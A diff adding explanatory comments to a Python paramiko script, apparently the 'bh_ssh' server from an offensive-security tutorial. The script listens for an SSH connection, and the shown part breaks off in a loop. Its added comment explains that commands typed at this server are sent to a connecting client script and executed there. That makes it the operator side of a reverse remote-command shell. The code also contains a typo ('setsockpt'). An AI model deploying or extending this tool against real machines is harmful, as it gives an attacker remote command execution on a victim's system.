@@ -7,8 +7,9 @@ import threading
 
 CWD = os.path.dirname(os.path.realpath(__file__))
 HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))
+# SSH key included in the paramiko demo files
 
-class Server (paramiko.ServerInterface):
+class Server (paramiko.ServerInterface): # SSH-inization of socket
     def __init__(self):
         self.event = threading.Event()
     
@@ -28,7 +29,7 @@ if __name__ == '__main__':
     try:
         sock =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockpt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind((server, ssh_port))
+        sock.bind((server, ssh_port))# Socket listener, the usual
         sock.listen(100)
         print('[+] Listening for connection...')
         client, addr = sock.accept()
@@ -37,7 +38,7 @@ if __name__ == '__main__':
     else:
         print('[+] Got a connection!', client, addr)
         
-    bhSession = paramiko.Transport(client)
+    bhSession = paramiko.Transport(client)# auth method configuration
     bhSession.add_server_key(HOSTKEY)
     server = Server()
     bhSession.start_server(server=server)
@@ -47,10 +48,11 @@ if __name__ == '__main__':
         print('**** No Channel')
         sys.exit(1)
     
-    print('[+] Authenticated')
+    print('[+] Authenticated')# When in
     print(chan.recv(1024))
     chan.send('Welcome to bh_ssh')
     try:
+    # any command typed into the ssh server will be sent to and executed by the client 𝘴𝘴𝘩_𝘳𝘤𝘮𝘥.𝘱𝘺
         while True:
             command= input('Enter command')
             if command != 'exit':
